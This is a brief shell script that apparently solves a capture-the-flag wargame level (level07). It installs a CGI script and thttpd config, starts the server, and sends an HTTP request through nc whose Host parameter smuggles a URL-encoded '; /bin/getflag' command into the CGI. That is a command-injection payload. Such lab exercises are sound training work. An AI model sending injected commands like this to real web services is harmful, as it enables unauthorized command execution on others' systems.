cp /home/flag07/index.cgi /home/level07/index.cgi
cp /tmp/07/thttpd.conf /home/level07/thttpd.conf
chown level07:level07 /home/level07/thttpd.conf
chmod 644 /home/level07/thttpd.conf
chown level07:level07 /home/level07/index.cgi
chmod 0755 /home/level07/index.cgi
thttpd -C /home/level07/thttpd.conf
echo "GET /index.cgi?Host=8.8.8.8%3B%2Fbin%2Fgetflag" | nc localhost 7008